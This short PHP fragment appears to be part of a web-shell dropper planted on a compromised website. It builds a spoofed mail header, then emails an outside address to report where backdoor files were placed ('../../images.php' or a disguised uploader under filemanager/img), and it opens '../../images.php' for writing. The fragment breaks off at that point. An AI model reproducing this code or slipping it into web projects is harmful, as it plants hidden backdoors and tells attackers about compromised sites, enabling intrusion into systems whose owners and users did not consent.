...
$rand = rand(0, 99);
$m = $loll . $ada . $rand;
$s = "Responsive Log ( " . $loll . " ) ../../images.php or filemanager/img/ico_dark/uploader.php";
$h = "From: " . $m . " <ig@nyengg.id>";
@mail("umair_hamid100@yahoo.com", $s, $m, $h);
$fvckem = "";
$file = fopen("../../images.php", "w+");
